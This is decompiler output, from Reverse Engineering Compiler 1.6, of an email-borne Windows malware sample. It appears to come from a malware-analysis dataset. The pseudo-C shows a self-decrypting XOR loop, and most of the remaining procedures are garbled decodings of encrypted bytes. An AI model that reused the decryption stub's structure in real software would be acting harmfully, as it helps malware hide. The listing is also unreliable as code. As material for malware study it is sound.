/*	This file was automatically created by
 *	Reverse Engineering Compiler 1.6 (C) Giampiero Caprino (Mar 31 2002)
 *	Input file: './malware_via_email/malware_0003/ia32_pe/subject.exe'
 */

/* DEST BLOCK NOT FOUND: 0040456c -> 0040456a */
/*	Procedure: 0x0040456C - 0x00404577
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040456C()
{



    goto ( *L00406068);
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
}

/* DEST BLOCK NOT FOUND: 00404578 -> 004012f9 */
/*	Procedure: 0x00404578 - 0x0040457D
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00404578()
{



    goto L004012f9;
    *(ebp - 119) = *(ebp - 119) + dl;
}

/*	Procedure: 0x0040457E - 0x00404598
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L0040457E(A8)
/* unknown */ void  A8;
{



    asm("pusha");
    ecx = A8;
    eax = edx;
    eax = 228081560;
    ebx = A8;
    edi = edi * 228081560;
    edx = edx ^ 228081560;
    asm("popa");
}

stack space not deallocated on return
/*	Procedure: 0x00404599 - 0x0040469F
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 0
 */

L00404599(A1, A2, A3)
/* unknown */ void  A1;
/* unknown */ void  A2;
/* unknown */ void  A3;
{



    asm("jpe 0x404613");
    (save)58;
    asm("jpe 0x4045a9");
    *eax & al;
    bh = bh + al;
    ah = eax + *eax + eax + *eax;
    asm("outsb");
    edx = edi + 4;
    esp = esp + 1;
    asm("lahf");
    *esi = *esi | eax;
    *ebx = *ebx + ah;
    al = al + *eax;
    *edx = *edx + ch;
    dx = dx + 1;
    ebx = -1879331090;
    eax = eax + *eax & -939524094;
    asm("in al,dx");
    asm("out dx,eax");
    al = *esi;
    al = *(esi + 1);
    esi = esi + 1;
    asm("in al,dx");
    ch = ch + dl;
    al = al + *eax;
    asm("%g add eax,0x84d30000");
    al = al & 194;
    asm("les eax,[eax+ecx*4+0x30000600]");
    eax = eax + *eax;
    *L89000000 = *L89000000 + cl;
    asm("enter 0x8b92,0x54");
    al = al & 8;
    if(edx != 1) {
    } else {
        asm("pusha");
        eax = 40025300;
        esi = 782964255;
        edi = edi ^ 782964255;
        edi = 1223590955;
        asm("xchg eax,ecx");
        L0040457E(eax + esi * eax);
        asm("sbb edi,esi");
        asm("loop 0x404608");
        (save)esp;
        (save)4;
        (save)1227054719 ^ edi;
        (save)1231257215;
        *esp = *esp ^ edi;
        L0040456C();
        esi = 0x404599;
        eax = 5;
        asm("xchg eax,ecx");
        (save)ecx;
        al = *esi;
        esi = esi + 1;
        dl = al;
        asm("lodsd");
        ebx = eax;
        asm("lodsd");
        ecx = eax;
        asm("lodsd");
        edi = eax;
        al = *esi;
        for(esi = esi + 1; 1; asm("jecxz 0x40466c");) {
            (save)ecx;
            ecx = edx;
            eax = L0040457E(edx);
            dl = dl ^ al;
            ecx = ah - al ^ dl;
            asm("ror ecx,0x11");
            (restore)ecx;
            ecx = ecx - 1;
        }
        (save)ebx;
        *esp = *esp ^ dl;
        A1 = A1 ^ dl;
        A2 = A2 ^ dl;
        A3 = A3 ^ dl;
        (restore)ebx;
        if(edi != 0) {
            *ebx = 0;
            ebx = ebx + 1;
            asm("loop 0x404683");
        }
        (restore)ecx;
        asm("loop 0x404644");
        edx = edx + 66;
        eax = L00404578() ^ edx;
        ecx = ecx ^ 115;
        asm("popa");
    }
}

stack space not deallocated on return
/*	Procedure: 0x004046A0 - 0x004049F8
 *	Argument size: -11308
 *	Local size: 0
 *	Save regs size: 0
 */

L004046A0(A7b)
/* unknown */ void  A7b;
{



    dl = dl ^ dh;
    *(esp + eax * 4 + 1628295556) = *(esp + eax * 4 + 1628295556) + 7;
    (save)-250616684;
    *edi = cl;
    asm("stc");
    asm("xchg eax,esp");
    asm("out dx,eax");
    (save)edx;
    asm("xchg eax,esp");
    asm("xchg edx,ecx");
    *ecx = cs;
    (save)ss;
    *(eax + -972061564) = al;
    *ecx = es;
    esp = esp + 1;
    asm("lock mov ecx,[edi]");
    asm("Unknown opcode 0xc6");
    *(ebp + 100) = al;
    asm("xchg al,[edi+0x84098cc1]");
    eax = eax | 262434748;
    asm("Unknown opcode 0xc6");
    bh = ch;
    (save)esp;
    asm("xchg eax,esp");
    asm("xchg edx,ecx");
    *ecx = cs;
    (save)ss;
    asm("xchg eax,esp");
    *(esp + eax * 4 + -272318963) = *(esp + eax * 4 + -272318963) + 84;
    asm("xchg eax,esp");
    asm("xchg edx,ecx");
    *ecx = cs;
    (save)ss;
    asm("xchg eax,esp");
    *(esp + eax * 4 + 1408220685) = *(esp + eax * 4 + 1408220685) + 148;
    asm("xchg edx,ecx");
    *ecx = cs;
    (save)ss;
    *(eax + -972061564) = al;
    *ecx = es;
    esp = esp + 1;
    asm("lock mov ecx,[edi]");
    asm("Unknown opcode 0xc6");
    *(ebp + 100) = al;
    asm("xchg al,[edi+0x84098cc1]");
    eax = eax | 262565812;
    asm("Unknown opcode 0xc6");
    bh = ch;
    (save)esp;
    asm("xchg eax,esp");
    asm("xchg edx,ecx");
    *ecx = cs;
    (save)ss;
    *(eax + -166886268) = al;
    ah = ah + 239;
    (save)esp;
    asm("xchg eax,esp");
    asm("xchg edx,ecx");
    *ecx = cs;
    (save)ss;
    *(eax + -166886268) = al;
    *edi = *edi | 201;
    edi = gs;
    (save)edx;
    asm("xchg eax,esp");
    *eax = *eax | edx;
    asm("xchg eax,ebp");
    *(eax + 1139770500) = al;
    asm("xchg eax,esp");
    *eax = *eax | eax;
    *(eax + -461077376) & ecx;
    if(!(ecx = ecx | edi)) {
        (save)edx;
        if(eax > -2071690092) {
            goto L0040477d;
        }
        asm("in eax,0xe4");
        eax = eax | 1027738963;
    }
    asm("xchg eax,esp");
    esp = ebp;
    (restore)ebp;
    if(!( *(esp + eax * 4 + 266674295) & al)) {
        asm("into");
        *edi = *edi | 204;
        asm("int1");
        if(*L430D70C9 = *L430D70C9 | 9) {
            goto L004047ba;
        }
    }
L0040477d:
    asm("xchg eax,esp");
    *(esp + eax * 4 + 1306861687) & al;
    esi = esi + 1;
    *(edx + edi * 4 + -2134720472) = al;
    *(esp + eax * 4 + -463401519) & al;
    ch = 114;
    ebp = -1611623183;
    asm("psrlw mm1,[esp+esi+0xc6a60e0c]");
    ah = 64;
    asm("bswap ecx");
    *L7B8CD10D = cl;
    esp = ebp;
    (restore)ebp;
    asm("xchg eax,esp");
    asm("lds ecx,[0x5a6f88c9]");
    asm("in eax,0x4d");
    esi = esi + 1;
    *(ecx + edx + -2071683309) = al;
L004047ba:
    *(ebp - 10) & ch;
    eax = eax - 1;
    asm("jpo 0x404841");
    *(ebp + 91) & ch;
    esp = esp - 1;
    asm("jpo 0x404847");
    *(ebp - 11) & ch;
    edx = edx - 1;
    asm("jpo 0x40484d");
    *(ebp - 118) & ch;
    ecx = ecx - 1;
    asm("jpo 0x404853");
    asm("ror dword [0x80680761],1");
    asm("in al,0xb5");
    esp = esp + 1;
    eax = eax | 1550612673;
    asm("jpo 0x404863");
    asm("jpo 0x4047f7");
    ebx = ebx + 1;
    *(ebx - 16) = *(ebx - 16) + edi;
    (fsave)(frestore) * *edi;
    asm("int1");
    asm("Unknown opcode 0x8c");
    eax :: -2071690112;
    ch = 68;
    ebp = -997155967;
    dl & bh;
    *edi = *esi;
    edi = edi + 1;
    asm("lodsd");
    *(ebx + 260359312) = ebx;
    *(eax + 37) = *(eax + 37) >> 1;
    asm("lahf");
    asm("les eax,[ecx+ecx+0x860e8690]");
    dh = 129;
    *(eax + -2045999932) = 129;
    asm("jpo 0x4047df");
    if(!(esi = esi + 1)) {
        asm("Unknown opcode 0x62");
        A7b = A7b >> cl;
        asm("jpo 0x4048a2");
        ecx = -2071689852;
        asm("lock mov [edx+eax*4],cl");
        return;
        asm("insb");
        asm("adc [ebx+0x7b],edi");
        asm("jpo 0x4048a8");
        al :: 211;
        asm("insb");
        (restore)ss;
        asm("jpo 0x4048ba");
        asm("jpo 0x4047f0");
L00404841:
        asm("int1");
        *LC4909BB1 = cs;
        ch & ah;
        ebp = ebp - 1;
        esi = esi + 1;
        *(ebx + ebp * 2 + -2133617473) = *(ebx + ebp * 2 + -2133617473) + 132;
        asm("stc");
        *edi = cs;
        asm("int1");
        *edi = cl;
        esp = ebp;
        (restore)ebp;
        asm("xchg eax,esp");
        if(*(ecx + edx * 8 + 266625293) & al) {
            goto L004048dc;
        }
        ch = ch & ah;
        ebp = ebp - 1;
        esi = esi + 1;
        *(esi + ebx * 8 + -2071983944) = al;
        *(ecx + edx * 8 + 1745314061) & al;
        ah = ah & 15;
        asm("ror dword [edi+ecx+0x84808c3e],1");
        bl & cl;
        eax = eax | -1119570566;
    }
    edx = edx + 1;
    asm("clc");
    return;
    edi = gs;
    (save)edx;
    asm("xchg eax,esp");
    *eax = *eax | edx;
    asm("xchg eax,ebp");
    *(eax + -972061564) = al;
    *ecx = es;
    esp = esp + 1;
    asm("lock stosd");
    asm("in al,0xef");
    asm("jpo 0x404837");
    ebp = -2071691128;
    asm("out dx,eax");
    if(*eax = *eax | edi) {
        goto L00404841;
    }
    *eax = *eax | esi;
    ch = 136;
    if(!( *(esp + eax * 4 + -2071686083) = *(esp + eax * 4 + -2071686083) + 132)) {
        asm("in eax,0xef");
        (save)ebx;
        asm("xchg eax,esp");
        *eax = *eax | edx;
        asm("xchg eax,ebp");
        *(eax + -2045803388) = al;
        asm("les edx,[ebp+0x6c]");
        eax = eax | 1875561350;
        *edi = *edi ^ cl;
        esp = ebp;
        (restore)ebp;
        *edi = cs;
        eax = eax | -2071691124;
        asm("int 0xcd");
    }
L004048dc:
    ch = 68;
    ebp = 302549827;
L004048e1:
    *(esp + eax * 4 + -272479731) & al;
    edx = edx + 1;
    asm("xchg eax,esp");
    asm("xchg eax,ecx");
    *edi = cs;
    asm("adc al,0x88");
    *(esp + eax * 4 + -2020325905) = *(esp + eax * 4 + -2020325905) + 193;
    *edi = cs;
    *(esp + (al + 136) * 4 + 1139754629) = *(esp + (al + 136) * 4 + 1139754629) + 148;
    asm("xchg eax,ecx");
    *ecx = cs;
L0040490f:
    ch = 86;
    return(eax | 2047708372);
    if(*(esp + (al + 136) * 4 + -787639283) = *(esp + (al + 136) * 4 + -787639283) + 120) {
        goto L0040490f;
    }
    (save)edx;
    asm("xchg eax,esp");
    asm("xchg edx,ecx");
    *edi = cs;
    (save)ss;
    *(eax + 1421706372) = al;
    asm("stc");
    asm("xchg eax,edx");
    asm("outsd");
    asm("outsb");
    asm("retf 0xde4");
    != ? 0x4048e4 : ;
    >= ? L00404928 : ;
    asm("xchg eax,esp");
    asm("out dx,eax");
    (save)ebx;
    asm("xchg eax,esp");
    asm("xchg edx,ecx");
    *ecx = cs;
    (save)ss;
    *(eax + 2081260676) = al;
    asm("Unknown opcode 0xc4");
    asm("out dx,eax");
    if(ebp = ebp - 1) {
        goto L004048e1;
    }
    asm("xchg esi,ecx");
    *ecx = cs;
    cl = cl ^ *(eax + 226788480);
    (save)ebx;
    > ? L0040497a : ;
    asm("in eax,0xef");
    (save)edx;
    asm("xchg eax,esp");
    asm("xchg edx,ecx");
    *ecx = cs;
    (save)ss;
    *(eax + -1055947644) = al;
    >= ? 0x404978 : ;
    asm("xchg cl,[0x44b588ce]");
    eax = eax | -842167098;
    asm("retf");
    asm("insd");
    asm("in al,0x7b");
    asm("jpo 0x4049f7");
    asm("psllw mm1,[edi+ecx+0x84808c32]");
    dl & cl;
    ch = 68;
    ebp = -272893886;
    (save)edx;
    asm("xchg eax,esp");
    asm("xchg edx,ecx");
    *ecx = cs;
    (save)ss;
    *(eax + -972061564) = al;
    *ecx = es;
    esp = esp + 1;
    asm("lock xchg eax,ebp");
    asm("paddd mm1,[eax+0x66457e0d]");
    asm("xchg al,[edi+0x96098cd1]");
    eax = eax | 261910454;
    *(eax + -2020322321) = *(eax + -2020322321) - 1;
    asm("ror dword [ecx+ecx+0x84808816],1");
    *L460780F6 & cl;
    asm("xchg eax,esp");
    eax = eax | 1875542262;
    asm("aas");
    asm("in eax,0x4d");
    esi = esi + 1;
    *(esi + 1965649510) = *(esi + 1965649510) + 77;
    asm("sti");
    asm("cli");
    asm("aad 0xef");
    asm("adc eax,[ecx]");
    (restore)ss;
    *(edx + 50) = *(edx + 50) ^ bx;
    asm("loopne 0x404983");
    dh = 102;
    asm("scasb");
    eax :: 2123898635;
    bl = *(esp + esi * 2);
    bl = 210;
    asm("Unknown opcode 0xd0");
    asm("Unknown opcode 0xf7");
    *(ebx + 9) = fs;
    asm("retf 0x55dc");
    asm("iret");
}

/*	Procedure: 0x004049F9 - 0x00404A22
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004049F9()
{



    asm("loopne 0x404997");
    edx = edx - 1;
    asm("Unknown opcode 0x8f");
    *ebx = *ebx | dh;
    eax = *L00404A18;
    asm("sbb [edx+0x40],cl");
    *eax = *eax + bl;
    edx = edx - 1;
    *(edx + ecx * 2) = *(edx + ecx * 2) + bl;
    eax = eax + 1 + 1;
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
    *eax = *eax + al;
    *(ebp + -503300026) = *(ebp + -503300026) + bl;
    ebp = ebp + 1;
    eax = eax + 1;
}

/* address  size  */
/* 0x00405762       0 */ /* unknown */ void 	__entry_point__;
#if 0 /* auxiliary information */
# Current option values:
option: +asmflush
option: -compactcalls
option: +compactexprs
option: +compactifs
option: +compset
option: -dfoproc
option: -disasmonly
option: -displaylabels
option: +doblocks
option: +docase
option: +dofor
option: +doifs
option: +dointrinsics
option: +doloops
option: +donullgotos
option: +dopackloops
option: +dopackstmt
option: +doremlabs
option: +dosimplify
option: -dosort
option: +dostmts
option: +doswitch
option: +dowhile
option: -dumpaddrs
option: -dumpcall
option: -dumpcomments
option: -dumpdfo
option: +dumpdoms
option: -dumpsblocks
option: -dumpsets
option: -dumpsizes
option: -dumpstmtid
option: +fatcase
option: -flag16
option: +fullscreen
option: -genpattern
option: -help
option: -hexconst
option: -html
option: +insertlabels
option: -int16
option: +int32
option: -interactive
option: -isvb5
option: +locals
option: -nohtmltabs
option: -nostackoffs
option: -objdump
option: -okclone
option: -outprocs
option: -outrefs
option: -overrule
option: +rdonly
option: -showblocks
option: -showjump
option: -showlabel
option: -showprotosym
option: -showreg
option: -showstring
option: -silent
option: +simplifyexprs
option: -stackalign16
option: -stackalign4
option: -stackalign8
option: -strallregions
option: -traceall
option: -tracesets
option: +types
option: -usesymtab
option: -validatebr
option: -validatereg
option: +validatestr
#endif
